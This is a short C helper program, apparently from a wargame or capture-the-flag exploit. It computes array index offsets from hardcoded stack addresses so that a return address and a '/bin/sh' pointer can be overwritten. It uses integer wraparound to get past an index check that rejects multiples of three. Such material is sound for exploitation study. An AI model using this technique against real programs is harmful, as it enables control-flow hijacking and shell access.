int main() {
	unsigned int ret_addr = 0xffffd51c;
	unsigned int bin_sh = 0xffffd524;
	unsigned int array_begin = 0xffffd544;

	unsigned int offset_ret = (ret_addr - array_begin) / 4;
	unsigned int bin_sh_offset = (bin_sh - array_begin) / 4;

	while (offset_ret % 3 == 0) {
		offset_ret += 0x40000000;
	}
	while (bin_sh_offset % 3 == 0) {
		bin_sh_offset += 0x40000000;
	}
	printf("offset ret = %#x %u\n", offset_ret, offset_ret);
	printf("bin_sh = %#x %u\n", bin_sh_offset, bin_sh_offset);
}